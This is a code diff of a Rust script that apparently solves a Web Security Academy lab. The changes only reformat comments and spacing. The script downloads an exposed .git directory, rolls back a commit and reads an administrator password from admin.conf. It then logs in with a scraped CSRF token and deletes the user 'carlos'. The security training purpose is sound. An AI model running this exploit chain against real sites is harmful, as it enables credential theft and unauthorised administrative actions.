@@ -37,14 +37,18 @@ use text_colorizer::Colorize;
 * Main Function
 *******************/
 fn main() {
-    let domain = "0a15004e03ef12cd871f1566008a007a.web-security-academy.net"; // change this to your lab URL
-    let client = build_client(); // build the client that will be used for all subsequent requests
+    // change this to your lab URL
+    let domain = "0a15004e03ef12cd871f1566008a007a.web-security-academy.net";
+
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
 
     print!(
         "{} ",
         "1. Fetching .git directory (wait 1 minute)..".white()
     );
     io::stdout().flush();
+
     // fetch the .git directory
     let fetch_git_dir = process::Command::new("wget")
         .args(["-r", &format!("https://{domain}/.git")])
@@ -53,19 +57,21 @@ fn main() {
             "{}",
             "[!] Failed to fetch .git directory using wget".red()
         ));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     print!("{} ", "2. Changing current working directory..".white());
     io::stdout().flush();
+
     // change the current working directory
     let change_dir = env::set_current_dir(format!("{domain}")).expect(&format!(
         "{}",
         "[!] Failed to change current working directory".red()
     ));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     print!("{} ", "3. Resetting to the previous commit..".white());
     io::stdout().flush();
+
     // reset to the previous commit
     let reset = process::Command::new("git")
         .args(["reset", "--hard", "HEAD~1"])
@@ -74,17 +80,19 @@ fn main() {
             "{}",
             "[!] Failed to list the current working directory".red()
         ));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     print!("{} ", "4. Reading admin.conf file..".white());
     io::stdout().flush();
+
     // read admin.conf file
     let admin_conf = fs::read_to_string("admin.conf")
         .expect(&format!("{}", "[!] Failed to read admin.conf file".red()));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     print!("{} ", "5. Extracting the administrator password..".white());
     io::stdout().flush();
+
     // extract admin password
     let admin_pass = admin_conf
         .split("=")
@@ -93,13 +101,14 @@ fn main() {
         .split("\n") // if you still a windows user, you may need to change this to \r\n
         .nth(0)
         .unwrap();
-    println!("{} => {}", "OK".green(), admin_pass.yellow());
 
+    println!("{} => {}", "OK".green(), admin_pass.yellow());
     print!(
         "{} ",
         "6. Fetching login page to get a valid session and csrf token..".white()
     );
     io::stdout().flush();
+
     // fetch login page, extract session cookie and csrf token
     let get_login = client
         .get(format!("https://{domain}/login"))
@@ -109,10 +118,11 @@ fn main() {
         .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
     let csrf =
         extract_csrf(get_login).expect(&format!("{}", "[!] Failed to extract csrf token".red()));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     print!("{} ", "7. Logging in as administrator..".white());
     io::stdout().flush();
+
     // login as admin
     let login = client
         .post(format!("https://{domain}/login"))
@@ -124,6 +134,8 @@ fn main() {
         .header("Cookie", format!("session={session}"))
         .send()
         .expect(&format!("{}", "[!] Failed to login as admin".red()));
+
+    // if login is successful, a redirection will occurred
     if login.status().as_u16() == 302 {
         println!("{}", "OK".green());
     }
@@ -136,14 +148,15 @@ fn main() {
 
     print!("{} ", "8. Deleting carlos..".white());
     io::stdout().flush();
+
     // delete carlos
     let delete_carlos = client
         .get(format!("https://{domain}/admin/delete?username=carlos"))
         .header("Cookie", format!("session={new_session}"))
         .send()
         .expect(&format!("{}", "[!] Failed to delete carlos".red()));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     println!(
         "{} {}",
         "🗹 Check your browser, it should be marked now as"
